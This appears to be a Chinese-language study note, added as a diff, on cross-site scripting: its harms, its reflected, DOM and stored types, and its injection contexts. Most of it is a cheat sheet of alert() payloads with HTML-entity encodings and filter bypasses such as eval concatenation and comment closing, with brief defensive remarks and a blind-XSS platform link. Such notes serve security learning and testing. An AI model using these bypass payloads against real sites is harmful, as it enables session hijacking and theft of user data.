@@ -1,0 +1,151 @@
+
+xss、csrf、ssrf：
+(1)XSS：
+危害：
+a.获取用户的cookie、蠕虫、重定向到恶意网站、
+b.挖矿：在访问存在xss的页面时利用目标机进行网页挖矿。  主要是吃cpu.
+c.内网渗透：若访问者位于内网，则可利用靶机浏览器探测内网、端口扫描等信息收集。
+d.调用摄像头：利用网页或浏览器的特性，能通过xss漏洞调用摄像头。
+e.组合应用：结合浏览器、路由器等漏洞，攻击电脑、路由器等。
+
+
+类型：
+a.反射型xss：非持久型：直接回显到页面。
+特点：经过服务端处理。
+b.DOM型xss：非持久型：在DOM解析过程中触发跨站脚本。
+特点：不经过服务器，通过前端js处理。
+c.存储型xss：[持久型]：直接 
+
+
+xss挖掘规范：
+console.log(6586)
+盲打类xss：仅允许外带domain信息。
+
+
+
+xss总结：
+
+使用firefox测试：使用时需灵活选择和测试.
+html标签中：插入html代码(可能需要前后闭合)，属性值处加不加单双引号或是否进行html实体编码都能触发xss.
+<iMg sRc=x onError=alert(8)>
+<iMg sRc=x onError='alert(8)'>
+<iMg sRc=x onError="alert(8)">
+<iMg sRc=x onError=&#97;&#108;&#101;&#114;&#116;&#40;&#56;&#41;>
+<iMg sRc=x onError='&#97;&#108;&#101;&#114;&#116;&#40;&#56;&#41;'>
+<iMg sRc=x onError="&#97;&#108;&#101;&#114;&#116;&#40;&#56;&#41;">
+防御：将特殊字符进行html实体编码.
+
+html标签的href、src等属性值处：插入html代码(即使进行html实体编码照样触发)
+<a href="&#106;&#97;&#118;&#65;&#115;&#99;&#114;&#105;&#80;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#51;&#41;">跳zw转...</a>
+故payload为：
+如：javAscriPt:alert(3)
+<a href=javAscriPt:alert(3)>tiao zhuan</a>
+<a href='javAscriPt:alert(3)'>tiao zhuan</a>
+<a href="javAscriPt:alert(3)">tiao zhuan</a>
+
+
+<iframe src=javAscriPt:alert('xsws');></iframe>
+<iframe src=javAscriPt:alert("xsws");></iframe>
+<iframe src='javAscriPt:alert("xsws");'></iframe>
+<iframe src="javAscriPt:alert('xsws');"></iframe>
+
+
+<iframe src=&#106;&#97;&#118;&#65;&#115;&#99;&#114;&#105;&#80;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#119;&#115;&#39;&#41;&#59;></iframe>
+<iframe src=&#106;&#97;&#118;&#65;&#115;&#99;&#114;&#105;&#80;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#119;&#115;&#34;&#41;&#59;></iframe>
+<iframe src='&#106;&#97;&#118;&#65;&#115;&#99;&#114;&#105;&#80;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#119;&#115;&#34;&#41;&#59;'></iframe>
+<iframe src="&#106;&#97;&#118;&#65;&#115;&#99;&#114;&#105;&#80;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#119;&#115;&#39;&#41;&#59;"></iframe>
+即使将payload部分进行html实体编码也能触发xss.
+
+
+
+需提交才能触发：
+<form action=JavAscriPt:alert(6)><input type=submit>
+<form action='JavAscriPt:alert(6)'><input type=submit>
+<form action="JavAscriPt:alert(6)"><input type=submit>
+<form action=&#74;&#97;&#118;&#65;&#115;&#99;&#114;&#105;&#80;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#54;&#41;><input type=submit>
+
+
+JSON字符串中不能进行html实体编码，故可尝试xss注入html代码.
+防御：对内联JSON进行转义.
+
+
+
+在onload、onerror、onclick等事件中，注入不受控制的js代码：
+<iMg Src=x oNeRror=alert(1)>
+<iMg Src=x oNeRror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+
+
+绕过过滤：
+1.使用/代替空格.
+<iMg/Src=x/oNeRror=alert(1);>
+<iMg/sRc='x'/onError=alert(2);>
+<iMg/sRc="x"/onError=alert(2)>
+<iMg/sRc='x'/onError=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+
+2.双写绕过.
+3.字符拼接：
+<iMg sRc="x" onError="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
+<iMg sRc="x" onError="a=`aler`;b=`t`;c='(6);';eval(a+b+c)">
+<iMg sRc="x" onError="a=`aler`;b=`t`;c='(6)';eval(a+b+c)">
+<iMg sRc="x" onError="&#97;&#61;&#96;&#97;&#108;&#101;&#114;&#96;&#59;&#98;&#61;&#96;&#116;&#96;&#59;&#99;&#61;&#39;&#40;&#54;&#41;&#39;&#59;&#101;&#118;&#97;&#108;&#40;&#97;&#43;&#98;&#43;&#99;&#41;">
+
+
+
+将payload部分进行html实体编码也能触发xss.
+<div onclick="alert('xss')">
+<dIv oNcLick=alert(6)>
+<dIv oNcLick='alert(6)'>
+<div onclick="alert(6)">
+<div onclick=" alert(8)">
+<dIv oNcLick=&#97;&#108;&#101;&#114;&#116;&#40;&#54;&#41;>
+<dIv oNcLick='&#97;&#108;&#101;&#114;&#116;&#40;&#54;&#41;'>
+<dIv oNcLick="&#97;&#108;&#101;&#114;&#116;&#40;&#54;&#41;">
+
+
+
+
+反射型和存储型xss输出位置：
+1.在html标签之间：闭合标签，直接内嵌
+如：
+<div class="test">xss paylaod</div>
+<div><img src=y onerror=alert(434)></div>
+<textarea></textarea><<img src=y onerror=alert(1)></textarea>
+
+
+
+
+2.html属性之内：闭合value，借助事件触发;闭合标签，另起新标签。
+如：
+<input type="text" value="xss payload">
+<input type="name" value=""><img src=y onerror=alert(434)>">
+<input type="name" value="" onclick=alert(3)>">
+
+
+
+
+
+3.javascript标签之内：直接插入paylaod
+如：
+<script type="text/javascript">xss payload</script>
+
+4.CSS标签之内：闭合标签
+如：
+<style type="text/css">body {xss payload}</style>
+
+
+过滤 			绕过
+(、)被替换未空	alert`1`
+闭合注释符		--!>	
+<!-- --!><script>alert(1)</script> -->		能触发成功。
+
+
+xss和浏览器关系很大，不同浏览器对不同的语法和编码处理方式都不太相同。
+
+
+
+
+xss盲打平台：
+https://xss.pt/xss.php?do=login
+当目标站点对cookie中重要参数(如sessionid)设置HttpOnly时，js无法读取该参数。
+
+
